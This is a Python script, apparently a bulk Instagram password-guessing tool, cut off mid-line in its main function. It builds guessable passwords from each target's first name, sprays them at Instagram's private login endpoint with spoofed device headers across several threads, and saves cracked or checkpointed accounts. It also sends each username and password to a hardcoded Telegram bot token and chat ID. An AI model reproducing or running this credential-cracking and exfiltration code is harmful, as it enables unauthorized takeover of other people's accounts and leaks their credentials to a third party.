import httpx
import json
import time
import os
import random
import uuid
import hashlib
import base64
from typing import Dict, List, Optional, Tuple
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import sys
from datetime import datetime
import pytz
import socket
import requests
import re
from time import sleep
from rich import print as KenXinDev
from rich.panel import Panel
from rich.console import Console
from rich.columns import Columns
#:-
token = '7547526933:AAHn5sTRbesNnb_e2EcKCzDc8LSqGbH8r_M'
ID = '7327921791'

# تهيئة colorama للألوان في الوحدة الطرفية
init(autoreset=True)

class InstagramAuthHelper:
    def __init__(self):
        self.machine_ids = {}
    
    def get_random_machine_id(self):
        return '' if not self.machine_ids else random.choice(self.machine_ids)

def KenXinDev(text, end='\n'):
    """Custom print function to mimic KenXinDev formatting with colorama."""
    text = text.replace('[bold bright_black]', Fore.BLACK + Style.BRIGHT)
    text = text.replace('[bold white]', Fore.WHITE + Style.BRIGHT)
    text = text.replace('[bold green]', Fore.GREEN + Style.BRIGHT)
    text = text.replace('[bold yellow]', Fore.YELLOW + Style.BRIGHT)
    text = text.replace('[/]', Style.RESET_ALL)
    print(text, end=end, flush=True)

def generate_passwords(fullname: str) -> List[str]:
    """Generate a list of passwords based on the first name with number patterns."""
    first_name = fullname.split()[0].lower() if fullname.strip() else ""
    if not first_name:
        return []
    passwords = [
        f"{first_name}123",
        f"{first_name}1234",
        f"{first_name}12345",
        f"{first_name}123456",
        f"{first_name}{first_name}",
        f"{first_name}1234567",
        f"{first_name}123456789",
        f"{first_name}12",
        f"{first_name}11"
    ]
    return passwords

class UserAgent:
    """A class to generate random Instagram User-Agent strings."""
    
    def __init__(self):
        self.kode_list = [
            '145652090', '206670917', '185203686', '192992561', '183982986',
            '206670927', '150338061', '240726452', '239490551', '239490548',
            '240726426', '240726476', '240726491'
        ]
        self.devices = [
            {"brand": "Infinix", "model": "Note 8", "code": "x692", "chip": "mediatek_helio_g80", "dpi": "480dpi", "res": "720x1640", "android": "30/11"},
        ]
        self.versions = ['359.0.0.59.89']

    def instagram_app(self) -> str:
        """Generate a random Instagram User-Agent string."""
        device = random.choice(self.devices)
        version = random.choice(self.versions)
        kode = random.choice(self.kode_list)
        ua_template = "Instagram {version} Android ({android}; {dpi}; {res}; {brand}; {model}; {code}; {chip}; fr_TN; {kode})"
        return ua_template.format(
            version=version, android=device["android"], dpi=device["dpi"], res=device["res"],
            brand=device["brand"], model=device["model"], code=device["code"], chip=device["chip"], kode=kode
        )

class Helper:
    """A utility class for generating IDs and network information."""
    
    def get_random_block_id(self) -> str:
        """Return a random block ID from a predefined list."""
        block_ids = [
            'edf962326770574232e3938baf0c2faebdbb23703933345b000509f560bd9965',
            'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
            '9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a',
            '16e9197b928710eafdf1e803935ed8c450a1a2e3eb696bff1184df088b900bcf'
        ]
        return random.choice(block_ids)

    def generate_android_id(self, user: str, passwd: str) -> str:
        """Generate an Android ID based on username and password."""
        try:
            return 'android-' + hashlib.md5((user + passwd).encode()).hexdigest()[:16]
        except Exception as e:
            print(f"{Fore.RED}[!] Error generating android_id: {str(e)}{Style.RESET_ALL}")
            return 'android-' + ''.join(random.choices('0123456789abcdef', k=16))

    def get_timezone_offset(self) -> float:
        """Return timezone offset for Tunisia (UTC+1) in seconds."""
        try:
            tunis_tz = pytz.timezone('Africa/Tunis')
            current_time = datetime.now(tunis_tz)
            offset_seconds = current_time.utcoffset().total_seconds()
            return offset_seconds  # Returns 3600 for UTC+1
        except Exception as e:
            print(f"{Fore.RED}[!] Error calculating timezone offset: {str(e)}{Style.RESET_ALL}")
            return 3600  # Fallback to UTC+1 (3600 seconds)

    def use_net(self) -> tuple:
        """Return network connection type."""
        return ('MOBILE.LTE', 'MOBILE(LTE)')

    def get_random_machine_id(self) -> str:
        """Generate a random machine ID."""
        return base64.b64encode(os.urandom(16)).decode('utf-8').rstrip('==')

class InstagramLogin:
    """A class to handle Instagram login with session management and challenge handling."""
    
    def __init__(self):
        self.accounts = []
        self.success_count = 0
        self.challenge_count = 0
        self.two_factor_count = 0
        self.failure_count = 0
        self.results = []
        self.loop_count = 0
        self.helper = InstagramAuthHelper()
        self.lock = threading.Lock()
        self.success = []
        self.checkpoint = []
        self.insta_log = "https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/"

    def initialize_session(self) -> httpx.Client:
        """Initialize a new session with default headers."""
        return httpx.Client(headers={
            "Accept-Encoding": "gzip",
            "X-Fb-Http-Engine": "Liger",
            "X-Fb-Client-Ip": "True",
            "X-Fb-Server-Cluster": "True"
        })

    def _check_internet_connection(self, timeout: float = 5.0) -> bool:
        """Check if there is an active internet connection."""
        try:
            socket.create_connection(("8.8.8.8", 53), timeout)
            return True
        except (socket.gaierror, socket.timeout, OSError):
            return False

    def login(self, username: str, password: str, session: httpx.Client) -> Dict[str, str]:
        """Attempt to log in to Instagram with provided credentials (single attempt)."""
        helper = Helper()
        user_agent = UserAgent().instagram_app()
        device_id = str(uuid.uuid4())
        family_device_id = str(uuid.uuid4())
        android_id = helper.generate_android_id(username, password)
        pigeon_session_id = f"UFS-{str(uuid.uuid4())}-3"
        pigeon_rawclienttime = f"{time.time():.3f}"
        bloks_version_id = helper.get_random_block_id()
        fb_connection_type, ig_connection_type = helper.use_net()

        headers = {
            "Host": "i.instagram.com",
            "X-Ig-App-Locale": "fr_TN",
            "X-Ig-Device-Locale": "fr_TN",
            "X-Ig-Mapped-Locale": "fr_TN",
            "X-Pigeon-Session-Id": pigeon_session_id,
            "X-Pigeon-Rawclienttime": pigeon_rawclienttime,
            "X-Bloks-Version-Id": bloks_version_id,
            "X-Ig-Www-Claim": "0",
            "X-Ig-Device-Id": device_id,
            "X-Ig-Family-Device-Id": family_device_id,
            "X-Ig-Android-Id": android_id,
            "X-Ig-Timezone-Offset": str(helper.get_timezone_offset()),
            "X-Fb-Connection-Type": fb_connection_type,
            "X-Ig-Connection-Type": ig_connection_type,
            "X-Ig-Capabilities": "3brTv10=",
            "X-Ig-App-Id": "567067343352427",
            "Priority": "u=3",
            "User-Agent": user_agent,
            "Accept-Language": "fr-TN,en-US;q=0.9",
            "X-Mid": self.helper.get_random_machine_id(),
            "Ig-Intended-User-Id": "0",
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept-Encoding": "gzip"
        }

        data = {
            'params': json.dumps({
                "client_input_params": {
                    "sim_phones": [],
                    "secure_family_device_id": "",
                    "has_granted_read_contacts_permissions": 0,
                    "auth_secure_device_id": "",
                    "has_whatsapp_installed": 0,
                    "password": f"#PWD_INSTAGRAM:0:{int(time.time())}:{password}",
                    "sso_token_map_json_string": "",
                    "event_flow": "login_manual",
                    "password_contains_non_ascii": "false",
                    "client_known_key_hash": "",
                    "encrypted_msisdn": "",
                    "has_granted_read_phone_permissions": 0,
                    "app_manager_id": "",
                    "device_id": android_id,
                    "login_attempt_count": 1,
                    "machine_id": self.helper.get_random_machine_id(),
                    "accounts_list": [],
                    "family_device_id": family_device_id,
                    "fb_ig_device_id": [],
                    "device_emails": [],
                    "try_num": 1,
                    "lois_settings": {"lois_token": "", "lara_override": ""},
                    "event_step": "home_page",
                    "headers_infra_flow_id": "",
                    "openid_tokens": {},
                    "contact_point": username
                },
                "server_params": {
                    "should_trigger_override_login_2fa_action": 0,
                    "is_from_logged_out": 0,
                    "should_trigger_override_login_success_action": 0,
                    "login_credential_type": "none",
                    "server_login_source": "login",
                    "waterfall_id": str(uuid.uuid4()),
                    "login_source": "Login",
                    "is_platform_login": 0,
                    "INTERNAL__latency_qpl_marker_id": 36707139,
                    "offline_experiment_group": None,
                    "is_from_landing_page": 0,
                    "password_text_input_id": "ofmgp5:146",
                    "is_from_empty_password": 0,
                    "is_from_msplit_fallback": 0,
                    "ar_event_source": "login_home_page",
                    "username_text_input_id": "ofmgp5:145",
                    "layered_homepage_experiment_group": None,
                    "should_show_nested_nta_from_aymh": 1,
                    "device_id": None,
                    "INTERNAL__latency_qpl_instance_id": random.random() * 1e14,
                    "reg_flow_source": "cacheable_aymh_screen",
                    "is_caa_perf_enabled": 1,
                    "credential_type": "password",
                    "is_from_password_entry_page": 0,
                    "caller": "gslr",
                    "family_device_id": None,
                    "is_from_assistive_id": 0,
                    "access_flow_version": "LEGACY_FLOW",
                    "is_from_logged_in_switcher": 0
                }
            }),
            'bk_client_context': json.dumps({
                "bloks_version": bloks_version_id,
                "styles_id": "instagram"
            }),
            'bloks_versioning_id': bloks_version_id
        }
#'''
        max_retries = 2
        retry_delay = 2
        for attempt in range(max_retries):
            if self._check_internet_connection():
                break
            print(f"{Fore.YELLOW}[!] No internet connection for {username}. Retrying in {retry_delay} seconds... (Attempt {attempt + 1}/{max_retries}){Style.RESET_ALL}")
            time.sleep(retry_delay)
        else:
            print(f"{Fore.RED}[!] No internet connection after {max_retries} attempts for {username}{Style.RESET_ALL}")
            with self.lock:
                self.failure_count += 1
            return {"status": "failed", "username": username, "password": password, "reason": "no_internet"}
#__
        try:
            with session.stream("POST", self.insta_log, headers=headers, data=data, timeout=60) as response:
                response_text = ""
                max_bytes = 2000
                for chunk in response.iter_bytes(chunk_size=1024):
                    response_text += chunk.decode('utf-8', errors='ignore')
                    if len(response_text.encode('utf-8')) >= max_bytes:
                        break
               
             
                if "Impossible d’enregistrer vos informations de connexion" in response_text:
                    with self.lock:
                        self.success_count += 1
                        self.success.append(username)
                    self._save_success_account(username, password)
                    return {"status": "success", "username": username, "password": password}
                elif "redirect_login_challenges" in response_text:
                    with self.lock:
                        self.challenge_count += 1
                        self.checkpoint.append(username)
                    self._save_challenge1_account(username, password)
                    return {"status": "challenge_required", "username": username, "password": password}
                    
                elif "challenge_required" in response_text:
                    with self.lock:
                        self.challenge_count += 1
                        self.checkpoint.append(username)
                    self._save_challenge_account(username, password)
                    return {"status": "challenge_required", "username": username, "password": password}
                else:
                    self._log_error_response(response_text)
                    with self.lock:
                        self.failure_count += 1
                    return {"status": "failed", "username": username, "password": password}
        except httpx.RequestError as e:
            self._log_error_response(str(e))
            with self.lock:
                self.failure_count += 1
            return {"status": "failed", "username": username, "password": password}

    def _save_success_account(self, username: str, password: str) -> None:
        """Save successful login detahhils to a file."""
        
        console = Console()
        
        render = Panel(
        "[bold green]𝚄𝚜𝚎𝚛[bold white]: [bold #00C8FF]{}[bold white] | [bold green]𝙿𝚊𝚜𝚜[bold white]: [bold #00C8FF]{}".format(username, password),
        style='bold green', width=80, title='[bold bright_black]>> [ 𝙾𝙺 ] <<[/]'
    )
        console.print(render)  # استخدام console.print بدلاً من KenXinDev
        
        os.makedirs("result", exist_ok=True)
        with open("result/success_accounts.txt", "a") as f:
            f.write(f"""@.   [success_accounts.txt] Success
├── Username: {username}
├── Password: {password}\n\n""")
        httpx.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✵ OK- : {username} ׀ {password}")

    def _save_challenge_account(self, username: str, password: str) -> None:
        """Save accounts requiring a challenge to a file."""

        console = Console()
       
        render = Panel(
        "[bold red]𝚄𝚜𝚎𝚛[bold white]: [bold #00C8FF]{}[bold white] | [bold red]𝙿𝚊𝚜𝚜[bold white]: [bold #00C8FF]{}".format(username, password),
        style='bold red', width=80, title='[bold bright_black]>> [ 𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝 ] <<[/]'
    )
        console.print(render)
        os.makedirs("result", exist_ok=True)
        with open("result/challenge_accounts.txt", "a") as f:
            f.write(f"""@.   [challenge_required] Checkpoint
├── Username: {username}
├── Password: {password}\n\n""")
        httpx.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✵ CP- : {username} ׀ {password}")

    def _save_challenge1_account(self, username: str, password: str) -> None:
        """Save accounts requiring a challenge to a file."""
        console = Console()
       
        render = Panel(
        "[bold yellow]𝚄𝚜𝚎𝚛[bold white]: [bold #00C8FF]{}[bold white] | [bold yellow]𝙿𝚊𝚜𝚜[bold white]: [bold #00C8FF]{}".format(username, password),
        style='bold yellow', width=80, title='[bold bright_black]>> [ 𝙲𝚑𝚎𝚌𝚔𝚙𝚘𝚒𝚗𝚝1 ] <<[/]'
    )
        console.print(render)
        os.makedirs("result", exist_ok=True)
        with open("result/challenge_accounts.txt", "a") as f:
            f.write(f"{username} | {password}\n\n")
        httpx.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=✵ CP1- : {username} ׀ {password}")

    def _log_error_response(self, response_text: str) -> None:
        """Log error responses to a file for debugging."""
        pass  # يمكنك إضافة تسجيل الأخطاء إذا لزم الأمر

    def attempt_login(self, username: str, passwords: List[str]) -> Dict[str, str]:
        """Attempt to log in with multiple passwords for a single usernajjme."""
        with self.initialize_session() as session:
            for password in passwords:
                result = self.login(username, password, session)
                self.results.append(result)
                if result["status"] in ["success", "challenge_required"]:
                    return result
                time.sleep(0.1)  # تأخير لتقليل معدل الطلبات
            return result

    def process_accounts(self, accounts: List[Tuple[str, List[str]]], max_workers: int = 5) -> None:
        """Process multiple accounts using threading with progress tracking."""
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(self.attempt_login, username, passwords): (username, passwords) for username, passwords in accounts}
            for future in as_completed(futures):
                username, passwords = futures[future]
                with self.lock:
                    self.loop_count += 1
                    KenXinDev(f'[bold bright_black]   ──> [bold white]𝙲𝚛𝚊𝚌𝚔 \033[1;36m {self.loop_count}[bold white]/\033[1;36m{len(accounts)} [bold white]| [bold white]𝙾𝚔 \033[1;30m: \033[1;32m{len(self.success)} [bold white]|  [bold white] 𝙲𝚙\033[1;30m :\033[1;33m \033[1;33m{len(self.checkpoint)}[bold white]  [/]', end='\r')  
                try:
                    result = future.result()
                    self.results.append(result)
                except Exception as e:
                    print(f"{Fore.RED}[!] Error processing {username}: {str(e)}{Style.RESET_ALL}")
                    with self.lock:
                        self.failure_count += 1

def load_accounts(file_path: str) -> List[Tuple[str, List[str]]]:
    """Load accounts from a file in the format username|fullname and generate passwords."""
    accounts = []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                if line and '|' in line:
                    username, fullname = line.split('|', 1)
                    passwords = generate_passwords(fullname)
                    if passwords:
                        accounts.append((username, passwords))
                    else:
                        print(f"{Fore.YELLOW}[!] No passwords generated for {username} (invalid fullname: {fullname}){Style.RESET_ALL}")
    except FileNotFoundError:
        print(f"{Fore.RED}[!] File {file_path} not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[!] Error reading file {file_path}: {str(e)}{Style.RESET_ALL}")
    return accounts

def main():
    """Main function to handle Instagram login for multiple accounts."""
    file_path = input(f"{Fore.CYAN} 𝙵𝚒𝚕𝚎 : {Style.RESET_ALL}")
    accounts = load_accounts(file_path)
    
    if not accounts:
        print(f"{Fore.RED}[!] No valid accounts found in {file_path}{Style.RESET_ALL}")
        return

    print(f"{Fore.CYAN}[*] 𝙰𝚝𝚝𝚊𝚌𝚔 {len(accounts)} 𝚊𝚌𝚌𝚘𝚞𝚗𝚝𝚜{Style.RESET_ALL}")
   
    login_handler
